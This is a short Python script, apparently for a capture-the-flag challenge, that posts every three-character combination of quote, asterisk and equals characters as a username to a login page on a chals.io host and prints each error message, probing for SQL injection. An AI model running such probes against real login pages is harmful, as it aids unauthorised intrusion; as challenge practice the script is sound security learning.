import itertools

import requests
from bs4 import BeautifulSoup

url = "https://spooky-space-intruder-web.chals.io/login"


for username in itertools.product("*='\"", repeat=3):
    username = ''.join([x for x in username])
    resp = requests.post(url, {"username": username, "password": "password"})
    soup = BeautifulSoup(resp.text, "html.parser")
    print(username, soup.find("div", {"class": "alert"}).text.strip())
